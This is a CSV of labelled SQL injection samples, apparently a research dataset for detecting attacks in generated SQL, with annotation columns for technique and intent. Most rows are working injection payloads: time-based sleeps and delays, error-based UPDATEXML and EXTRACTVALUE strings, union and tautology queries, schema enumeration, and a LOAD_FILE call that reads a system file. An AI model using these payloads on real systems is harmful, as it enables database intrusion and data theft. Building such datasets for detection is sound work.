row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
7757,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1385'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'mjjd'  =  'mjjd,-1385' ) ) ) OR 5903 = ( 'QQPJQ'|| ( SELECT CASE 5903 WHEN 5903 THEN 1 ELSE 0 END FROM RDB$DATABASE ) ||'QZVZQ' ) AND ( ( ( 'MJJD' = 'MJJD,injection_fragment,UNKNOWN,rdb,end,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,rdb,3
6491,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   waitfor delay '0:0:5' and   (  'fpnh'  =  'fpnh,1' ) WAITFOR DELAY '0:0:5' AND ( 'FPNH' = 'FPNH,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
90,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'","SELECT * FROM USERS WHERE ID = '1' UNION SELECT ( \ ) ,@@VERSION -- 1'",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data from users,union_based,confidentiality,True,True,False,True,False,True,False,False,False,False,users,3
203,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,AND 1 = UTL_INADDR.GET_HOST_ADDRESS ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'I' = 'I,injection_fragment,UNKNOWN,dual,login_user,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
8020,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --","1' ) AS BVVL WHERE 9818 = 9818 AND ( SELECT 9067 FROM ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 9067 = 9067,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY X ) A ) --",injection_fragment,UNKNOWN,character_sets,9067,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,schema_enumeration_fragment,confidentiality,False,True,False,True,False,True,False,True,False,False,character_sets,3
740,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,select * from users where id  =  1 or \+<\ or 1  =  1 -- 1,SELECT * FROM USERS WHERE ID = 1 OR \+<\ OR 1 = 1 -- 1,full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
4655,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""cgpm"" like ""cgpm","1"" OR ROW ( 1045,7562 ) > ( SELECT COUNT ( * ) ,CONCAT ( 0X7171706A71, ( SELECT ( ELT ( 1045 = 1045,1 ) ) ) ,0X717A767A71,FLOOR ( RAND ( 0 ) *2 ) ) X FROM ( SELECT 8488 UNION SELECT 5584 UNION SELECT 3051 UNION SELECT 1210 ) A GROUP BY X ) AND ""CGPM"" LIKE ""CGPM",injection_fragment,UNKNOWN,,0x717a767a71,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,union_based_fragment,confidentiality,True,True,False,False,False,False,False,True,True,False,,3
390,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR ""; ( "" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,stacked_query,confidentiality,False,False,True,True,False,False,False,False,False,False,users,3
40,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...","1; ( LOAD_FILE ( CHAR ( 47,101,116,99,47,112,97,115, ...",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,stacked_fragment,confidentiality,False,False,True,False,False,False,False,True,True,False,,3
3219,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy","1' ) ) AND 5556 = ( SELECT COUNT ( * ) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5 ) AND ( ( 'NVSY' LIKE 'NVSY",injection_fragment,UNKNOWN,all_users,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,all_users,3
3827,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'+  (  select 'aliz' where 5050  =  5050 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'","1'+ ( SELECT 'ALIZ' WHERE 5050 = 5050 OR 4411 = ( SELECT COUNT ( * ) FROM SYSUSERS AS SYS1,SYSUSERS AS SYS2,SYSUSERS AS SYS3,SYSUSERS AS SYS4,SYSUSERS AS SYS5,SYSUSERS AS SYS6,SYSUSERS AS SYS7 ) ) +'",injection_fragment,UNKNOWN,sysusers,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,sysusers,3
6640,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #","1%"" OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
11296,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1'|| ( SELECT 'QTEP' WHERE 2572 = 2572 OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
10209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-2718""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""kbvd"" like ""kbvd","-2718"" ) OR 4747 = DBMS_UTILITY.SQLID_TO_SQLHASH ( ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4747 = 4747 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) AND ( ""KBVD"" LIKE ""KBVD",injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
7677,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )    as crzr where 5373  =  5373 and elt  (  3114  =  3114,sleep  (  5   )    )   #","1' ) ) AS CRZR WHERE 5373 = 5373 AND ELT ( 3114 = 3114,SLEEP ( 5 ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
6185,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # odvp,1 AND 7756 = DBMS_UTILITY.SQLID_TO_SQLHASH ( ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 7756 = 7756 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) ) # ODVP,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,dual,3
2869,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"waitfor delay '0:0:5' and ""%""  =  ""","WAITFOR DELAY '0:0:5' AND ""%"" = """,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
5084,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1%' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and '%'  =  ',1%' AND 6969 = ( SELECT 6969 FROM PG_SLEEP ( 5 ) ) AND '%' = ',injection_fragment,UNKNOWN,pg_sleep,6969,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,False,True,False,False,True,False,False,pg_sleep,3
6762,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'+  (  select 'jmdl' where 7827  =  7827,1'+ ( SELECT 'JMDL' WHERE 7827 = 7827,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
5198,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  8023  =  8023,1 ) ) ) AND 4386 = UTL_INADDR.GET_HOST_ADDRESS ( CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4386 = 4386 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ) AND ( ( ( 8023 = 8023,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,fingerprinting_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,dual,3
7669,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,-1344 ) AS GQGI WHERE 2545 = 2545 OR 4144 = ( SELECT UPPER ( XMLTYPE ( CHR ( 60 ) ||CHR ( 58 ) ||CHR ( 113 ) ||CHR ( 113 ) ||CHR ( 112 ) ||CHR ( 106 ) ||CHR ( 113 ) || ( SELECT ( CASE WHEN ( 4144 = 4144 ) THEN 1 ELSE 0 END ) FROM DUAL ) ||CHR ( 113 ) ||CHR ( 122 ) ||CHR ( 118 ) ||CHR ( 122 ) ||CHR ( 113 ) ||CHR ( 62 ) ) ) FROM DUAL ) --,injection_fragment,UNKNOWN,dual,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,dual,3
25393,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,FROM  ( SELECT DISTINCT most FROM earth ),FROM ( SELECT DISTINCT MOST FROM EARTH ),injection_fragment,UNKNOWN,"earth, ( select distinct most from earth )",most,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,False,False,earth,3
9301,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #","1' IN BOOLEAN MODE ) AND UPDATEXML ( 3393,CONCAT ( 0X2E,0X7171706A71, ( SELECT ( ELT ( 3393 = 3393,1 ) ) ) ,0X717A767A71 ) ,1161 ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
5881,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,-7874 ) ) ) OR 2724 IN ( ( CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 112 ) +CHAR ( 106 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 2724 = 2724 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 122 ) +CHAR ( 118 ) +CHAR ( 122 ) +CHAR ( 113 ) ) ) AND ( ( ( 2817 = 2817,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
9852,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#","-8982'+ ( SELECT ANYD WHERE 5358 = 5358 UNION ALL SELECT 5358,5358,5358,5358,5358,5358#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,False,True,False,,3
3076,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  8671  =  8671","1 ) ) ) OR 8466 = BENCHMARK ( 5000000,MD5 ( 0X694A4745 ) ) AND ( ( ( 8671 = 8671",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
10987,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --","1' ) AS MMHE WHERE 2142 = 2142 OR 8466 = BENCHMARK ( 5000000,MD5 ( 0X694A4745 ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
3329,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   -- yczq,1 AND 6969 = ( SELECT 6969 FROM PG_SLEEP ( 5 ) ) -- YCZQ,injection_fragment,UNKNOWN,pg_sleep,6969,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,False,False,pg_sleep,3
2303,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1 ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) VWYQ ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
6065,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 6954  =  6954 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --","1 ) WHERE 6954 = 6954 AND 3824 = BENCHMARK ( 5000000,MD5 ( 0X76555642 ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
3508,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #","1"" OR ELT ( 5873 = 5873,SLEEP ( 5 ) ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,True,True,False,False,True,True,False,,3
675,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,select * from users where id  =  1 %  (  1  )   or 1  =  1 -- 1,SELECT * FROM USERS WHERE ID = 1 % ( 1 ) OR 1 = 1 -- 1,full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
7092,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'||  (  select 'nwve' where 7721  =  7721,1'|| ( SELECT 'NWVE' WHERE 7721 = 7721,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,False,False,False,False,True,True,False,,3
5558,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 3535  =  3535 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --","1 WHERE 3535 = 3535 AND 3580 = ( SELECT COUNT ( * ) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3 ) --",injection_fragment,UNKNOWN,domains,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,False,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,False,False,domains,3
4957,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   and sleep  (  5  )   and   (  'orxt'  =  'orxt,1' ) AND SLEEP ( 5 ) AND ( 'ORXT' = 'ORXT,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,False,False,False,True,False,False,True,True,False,,3
7059,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  'npzh'  =  'npzh,1' ) ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SGVO ) AND ( ( ( 'NPZH' = 'NPZH,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,False,True,False,False,True,True,False,,3
14,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1","SELECT * FROM USERS WHERE ID = 1 OR "" ( ]"" OR 1 = 1 -- 1",full_query,SELECT,users,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,T1,,False,False,False,False,,,,,,,,,,,,T1,confidentiality,exfiltrate sensitive data,exfiltrate data from users,comment_terminated,confidentiality,False,False,False,True,False,False,False,False,False,False,users,3
2653,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","1 ) ) AS NLZG WHERE 1482 = 1482 PROCEDURE ANALYSE ( EXTRACTVALUE ( 5840,CONCAT ( 0X5C,0X7171706A71, ( SELECT ( CASE WHEN ( 5840 = 5840 ) THEN 1 ELSE 0 END ) ) ,0X717A767A71 ) ) ,1 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
6402,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   as nftr where 8825  =  8825 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1' ) AS NFTR WHERE 8825 = 8825 OR ( SELECT * FROM ( SELECT ( SLEEP ( 5 ) ) ) SDDO ) #,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,time_based_fragment,confidentiality,False,True,False,True,True,False,False,True,True,False,,3
3531,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 6881  =  6881 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --","1 WHERE 6881 = 6881 PROCEDURE ANALYSE ( EXTRACTVALUE ( 5840,CONCAT ( 0X5C,0X7171706A71, ( SELECT ( CASE WHEN ( 5840 = 5840 ) THEN 1 ELSE 0 END ) ) ,0X717A767A71 ) ) ,1 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T1,confidentiality,exfiltrate data,exfiltrate data,subquery_fragment,confidentiality,False,True,False,True,False,False,False,True,True,False,,3
